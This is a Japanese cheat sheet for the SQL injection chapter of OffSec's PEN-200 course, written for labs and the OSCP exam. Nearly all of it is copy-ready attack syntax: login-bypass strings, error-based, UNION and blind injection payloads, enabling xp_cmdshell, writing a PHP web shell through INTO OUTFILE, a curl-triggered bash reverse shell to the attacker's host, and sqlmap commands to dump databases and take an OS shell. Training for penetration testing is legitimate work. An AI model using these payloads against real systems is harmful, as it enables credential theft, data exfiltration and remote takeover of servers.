# OffSec PEN-200 第10章 SQLインジェクション攻撃 チートシート

PEN-200 第10章「SQLインジェクション攻撃（SQL Injection Attacks）」に対応した、実技ラボおよびOSCP試験向けの実戦リファレンスです。
検索性の最適化とコピペ耐性（プレースホルダー明記）を重視し、手動エクスプロイトからRCE、自動化ツール（sqlmap）の構文までを網羅しています。

---

## 1. データベース偵察・直接接続

侵入テスト中にデータベースのポートが開放されている場合や、認証情報を入手した際の直接列挙用コマンドです。

### 1.1 MySQL (デフォルトポート: 3306)
Kali Linux の標準クライアントを用いてリモートの MySQL/MariaDB インスタンスに接続します。

```bash
# リモート MySQL への接続（TLSエラー回避フラグ付き）
mysql -u <USER> -p'<PASSWORD>' -h <TARGET_IP> -P 3306 --skip-ssl-verify-server-cert

# 接続時の TLS/SSL エラー（ERROR 2026）を回避する場合
mysql -u <USER> -p'<PASSWORD>' -h <TARGET_IP> -P 3306 --skip-ssl
```

#### MySQL 列挙用内部クエリ
```sql
-- バージョンの確認
SELECT version();

-- 接続中ユーザーとホストの確認
SELECT system_user();

-- 利用可能なデータベース一覧の表示
SHOW databases;

-- データベースの切り替え
USE <DATABASE_NAME>;

-- テーブル一覧の表示
SHOW tables;

-- ユーザー名とパスワードハッシュ（Caching-SHA-256等）の抽出
SELECT user, authentication_string FROM mysql.user WHERE user = '<USER>';
```

---

### 1.2 Microsoft SQL Server (MSSQL / デフォルトポート: 1433)
Impacket の `impacket-mssqlclient` を使用し、TDS（Tabular Data Stream）プロトコル経由で接続します。`-windows-auth` を指定することで NTLM 認証を強制します。

```bash
# Windows NTLM 認証を用いた MSSQL への接続
impacket-mssqlclient <DOMAIN>/<USER>:<PASSWORD>@<TARGET_IP> -windows-auth

# ローカルユーザーとして接続する場合
impacket-mssqlclient <USER>:<PASSWORD>@<TARGET_IP> -windows-auth
```

#### MSSQL 列挙用内部クエリ
*※ リモートTDS接続時は末尾の `GO` は省略可能です。*
```sql
-- OSおよびSQL Serverバージョンの取得
SELECT @@version;

-- 利用可能なデータベース一覧の確認
SELECT name FROM sys.databases;

-- 指定データベース内のテーブル一覧を確認
SELECT * FROM <DATABASE_NAME>.information_schema.tables;

-- テーブル内の全レコード取得（dbo スキーマを指定）
SELECT * FROM <DATABASE_NAME>.dbo.<TABLE_NAME>;

-- master データベース内のユーザー確認
SELECT * FROM master.dbo.sysusers;
```

---

## 2. 手動によるSQLインジェクション (Manual SQLi)

### 2.1 認証バイパス (Authentication Bypass)
ログインフォームの入力値に対して閉じクォートを挿入し、`OR 1=1` とコメント記号を付与して後続のパスワード検証を無効化します。
*※ `--` の後には空白が必要です。入力切り詰めを防ぐため末尾に `//` などを付加します。*

```text
# 典型的なユーザー名フィールド用バイパスペイロード
' OR 1=1 -- //
admin' -- //
' or 1=1#
```

---

### 2.2 エラーベース SQLi (Error-based SQLi)
意図的にデータ型の不一致や構文エラーを発生させ、Webアプリケーションのエラーメッセージ経由で内部データを漏洩させます。

```text
# データベースバージョンの抽出 (MySQL / @@version)
' or 1=1 in (select @@version) -- //

# 特定テーブル（users）のパスワードカラムの抽出
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
```

---

### 2.3 UNIONベース SQLi (UNION-based SQLi)
元のクエリ結果と同一の画面上に、追加の `SELECT` 文の結果を連結して表示させます。

#### Step 1: 正確なカラム数の特定 (`ORDER BY`)
エラーが発生するまでカラム番号を1ずつ増やします。
```text
' ORDER BY 1-- //
' ORDER BY 2-- //
' ORDER BY 5-- //
' ORDER BY 6-- //  <-- エラーが発生した場合、カラム数は 5
```

#### Step 2: 表示カラムとデータ型の特定
```text
%' UNION SELECT 'a1', 'a2', 'a3', 'a4', 'a5' -- //
' UNION SELECT null, null, null, null, null -- //
```

#### Step 3: データベース名・ユーザー・バージョンの列挙
```text
' UNION SELECT null, null, database(), user(), @@version -- //
```

#### Step 4: スキーマ・テーブル名・カラム名の列挙
```text
# 現在のデータベースに属する全テーブルとカラムを取得
' UNION SELECT null, table_name, column_name, table_schema, null FROM information_schema.columns WHERE table_schema=database() -- //
```

#### Step 5: ターゲットデータの抽出
```text
# users テーブルから認証情報（ユーザー名、パスワードハッシュ等）をダンプ
' UNION SELECT null, username, password, description, null FROM users -- //
```

---

### 2.4 ブラインド SQLi (Blind SQLi)
データベースのエラーや結果が画面に直接返らない環境に対する推論型インジェクションです。

#### ブール型ブラインド (Boolean-based)
条件式の真偽（TRUE / FALSE）によるWebアプリケーションの表示・挙動の変化を観測します。
```text
# TRUE 条件（データが存在する場合のみ正常応答）
http://<TARGET_IP>/blindsqli.php?user=offsec' AND 1=1 -- //

# FALSE 条件（エラーまたは空白応答）
http://<TARGET_IP>/blindsqli.php?user=offsec' AND 1=2 -- //
```

#### タイムベースブラインド (Time-based)
サーバーの応答遅延（Sleep）の有無から条件の真偽を判定します。
```text
# MySQL: 条件が真の場合に 3 秒待機
http://<TARGET_IP>/blindsqli.php?user=offsec' AND IF (1=1, sleep(3), 'false') -- //

# MSSQL: 5 秒待機
'; WAITFOR DELAY '0:0:5'--
```

---

## 3. SQLiからのOSコマンド実行・RCE

データベース管理者の権限およびファイル書き込み権限を利用して、基盤となるOSのコマンドを実行します。

### 3.1 MSSQL: `xp_cmdshell` によるコマンド実行
`sa` または管理者権限を持つセッションで、無効化されている `xp_cmdshell` を有効化して実行します。

```sql
-- 1. 高度なオプションの有効化
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;

-- 2. xp_cmdshell の有効化
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- 3. 任意の OS コマンド実行
EXECUTE xp_cmdshell 'whoami';
EXECUTE xp_cmdshell 'powershell -c "<REVERSE_SHELL_COMMAND>"';
```

---

### 3.2 MySQL: `INTO OUTFILE` による Web シェル配置
Webルート下の書き込み可能ディレクトリが判明している場合、UNION インジェクション経由で PHP Web シェルをファイルとして書き込みます。

```text
# UNION SELECT を用いて Web ルート配下に webshell.php を書き込み
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```

#### Web シェルの動作確認とコマンド実行
```bash
# 書き込んだ Web シェル経由で OS コマンドを実行
curl -s "http://<TARGET_IP>/tmp/webshell.php?cmd=id"

# リバースシェルの実行例
curl -s "http://<TARGET_IP>/tmp/webshell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/<KALI_IP>/<LPORT>+0>%261'"
```

---

## 4. sqlmap による自動化

> **※ OSCP 試験における注意事項**:
> sqlmap などの自動スキャナー・自動エクスプロイトツールは、OSCP 試験規則において使用制限または禁止対象となる場合があります。試験では原則手動での検証が求められるため、ツールの挙動と手動構文の両方を必ず把握しておいてください。

### 4.1 基本スキャン・パラメータテスト
```bash
# 単一の GET パラメータに対する脆弱性スキャン
sqlmap -u "http://<TARGET_IP>/blindsqli.php?user=1" -p user

# 対話型プロンプトをすべてデフォルト（Yes）で自動進行する場合 (--batch)
sqlmap -u "http://<TARGET_IP>/blindsqli.php?user=1" -p user --batch
```

### 4.2 データベースとテーブルのダンプ
```bash
# 検出された脆弱性を利用してデータベース全体をダンプ
sqlmap -u "http://<TARGET_IP>/blindsqli.php?user=1" -p user --dump

# 特定のデータベースおよびテーブルを指定してダンプ
sqlmap -u "http://<TARGET_IP>/blindsqli.php?user=1" -p user -D offsec -T users --dump
```

### 4.3 HTTP リクエストファイル (`-r`) を用いた POST リクエストのテスト
Burp Suite の HTTP History からリクエスト全体をテキストファイル（例: `post.txt`）として保存し、直接読み込ませます。

```bash
# リクエストファイルを指定して特定パラメータ (item) をテスト
sqlmap -r post.txt -p item
```

### 4.4 `--os-shell` による対話型シェルの自動奪取
書き込み可能な Web ルートディレクトリを指定して、バックドアの自動配置と対話型シェルを起動します。

```bash
# Web ルートを指定して対話型 OS シェルを要求
sqlmap -r post.txt -p item --os-shell --web-root "/var/www/html/tmp"
```
実行時に Web アプリケーション言語（PHP 等）を選択すると、スタンプファイルとバックドアが自動アップロードされ、`os-shell>` プロンプトが起動します。
